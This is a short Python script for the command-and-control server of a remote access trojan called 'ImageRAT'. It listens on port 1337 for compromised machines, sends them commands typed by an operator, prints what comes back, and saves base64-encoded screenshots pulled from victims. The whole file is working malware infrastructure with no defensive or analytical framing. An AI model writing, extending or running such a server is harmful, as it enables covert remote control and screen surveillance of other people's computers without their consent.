#!/usr/bin/env python3
import socketserver
import base64

class C2Handler(socketserver.BaseRequestHandler):
    def handle(self):
        print(f"[+] {self.client_address[0]} connected!")
        while True:
            cmd = input(f"{self.client_address[0]}> ")
            self.request.send(cmd.encode())
            if cmd == "exit": break
            
            if cmd == "screenshot":
                data = self.request.recv(1024000)
                with open(f"screenshot_{self.client_address[0]}.png", "wb") as f:
                    f.write(base64.b64decode(data))
                print("[+] Screenshot saved!")
            else:
                result = self.request.recv(4096).decode()
                print(result)

if __name__ == "__main__":
    server = socketserver.ThreadingTCPServer(("0.0.0.0", 1337), C2Handler)
    print("[+] ImageRAT C2 Server running on :1337")
    server.serve_forever()
